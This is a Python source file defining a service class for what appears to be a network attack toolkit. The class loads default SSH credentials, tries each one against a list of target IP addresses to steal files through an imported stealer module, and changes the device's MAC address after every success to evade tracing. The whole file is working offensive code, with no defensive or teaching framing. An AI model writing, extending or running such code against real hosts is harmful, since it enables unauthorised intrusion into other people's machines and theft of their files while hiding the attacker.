import os
import time
from attacks.file_stealer import FileStealer
from utils.logger import Logger

class FileStealerService:
    def __init__(self, wifi_service, logger=None, creds_path="config/ssh_default_credentials.txt"):
        self.logger = logger or Logger(log_file="logs/scan.log")
        self.wifi_service = wifi_service
        self.stealer = FileStealer(logger=self.logger)
        self.creds = self._load_credentials(creds_path)

    def _load_credentials(self, path):
        creds = []
        for p in (path, "/root/ssh_default_credentials.txt"):
            if os.path.exists(p):
                with open(p) as f:
                    for line in f:
                        parts = line.strip().split(":", 1)
                        if len(parts) == 2:
                            creds.append({"username": parts[0], "password": parts[1]})
                break
        self.logger.log(f"[INFO] Loaded {len(creds)} SSH credential(s).")
        return creds

    def steal(self, targets):
        succeeded = []
        for t in targets:
            ip = t["ip"]
            for cred in self.creds:
                ok = self.stealer.steal_files(
                    target_ip=ip,
                    username=cred["username"],
                    password=cred["password"],
                    os_type=t.get("os_version")
                )
                if ok:
                    succeeded.append(ip)
                    # per-host MAC rotate on success
                    self.logger.log(f"[SUCCESS] File stealing successful for IP: {ip}. Rotating MAC.")
                    self.wifi_service.disconnect()
                    self.wifi_service.change_mac()
                    time.sleep(1)
                    break
        self.logger.log(f"[INFO] File stealing succeeded on {len(succeeded)} host(s).")
        return succeeded
